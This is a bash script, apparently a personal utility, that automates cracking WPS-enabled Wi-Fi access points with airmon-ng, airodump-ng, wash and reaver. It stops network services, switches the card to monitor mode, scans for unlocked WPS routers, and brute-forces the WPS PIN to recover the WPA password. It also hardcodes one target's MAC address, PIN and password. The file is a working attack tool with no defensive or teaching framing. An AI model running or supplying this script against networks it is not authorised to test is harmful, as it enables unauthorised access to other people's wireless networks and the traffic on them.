#!/bin/bash
# Script to get wifi password
#
# Autor: Leandro Luiz
# email: lls.homeoffice@gmail.com
#

MODULE="0"
INTERFACE="wlan"${MODULE}"mon"
VENDOR="Broadcom"
ESSID="AP 104"

start()
{
	echo "Stop network services"
	airmon-ng check kill
	killall wpa_supplicant 2> /dev/null
	
	airmon-ng start "wlan"${MODULE}
	
	capture

}

capture()
{

	echo "Start capture on ${INTERFACE}"
	
	#airodump-ng ${INTERFACE}
	airodump-ng ${INTERFACE} --wps --essid-regex "${ESSID}" --channel 2

}

unlock()
{
	
	echo "Look for unlock ESSID"
	#clear && wash -i ${INTERFACE}
	clear && wash -i ${INTERFACE} | grep -v ${VENDOR}
	
}

stop()
{
	
	echo "Start network services"
	airmon-ng stop "wlan"${MODULE}"mon"
	ifconfig "wlan"${MODULE} up
	service networking start
	
}

pin()
{
	
	crack "$1"
	
	echo "Run reaver to get PIN on ${ESSID} ${VENDOR} "
	
	# WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
	#reaver -i ${INTERFACE} -b ${MAC} -c ${CHANNEL} -K 1 -vv
	
	# WPS pin not found!
	#reaver -i ${INTERFACE} -b ${MAC} -KvvNwL -c ${CHANNEL}
	
	# WPS transaction failed
	# WARNING: Receive timeout occurred
	reaver -i ${INTERFACE} -b ${MAC} -vvNwL -c ${CHANNEL}
	
}

password()
{

	crack "$1"

	echo "Run reaver with PIN to get Password"
	reaver -i ${INTERFACE} -b ${MAC} -vvNwL -c ${CHANNEL} -p ${PIN}

}

crack()
{
	case "$1" in
		miyagi)
			CHANNEL="1"
			ESSID="Miyagi_do"
			MAC="68:02:B8:28:13:8D"
			VENDOR="AtherosC"
			DBM="-34"
			PIN="12345670"
			PASSWORD="Okinawa1"
			REPEATER="192.168.0.254"
			GATEWAY="192.168.0.1"
			;;
		*)
			echo "Use: `basename $0` [pin|password] [NAME]"
			echo "Names:"
			echo "miyagi"
			echo "Please, create a new name!"
			exit 1
			;;
	esac
	
}

case "$1" in
	start)
		start
		;;
	stop)
		stop
		;;
	capture)
		capture
		;;
	unlock)
		unlock
		;;
	pin)
		pin "$2"
		;;
	password)
		password "$2"
		;;
	*)
		echo "Use: `basename $0` {start|stop|capture|unlock|pin|password} [NAME]"
		exit 1
		;;
esac
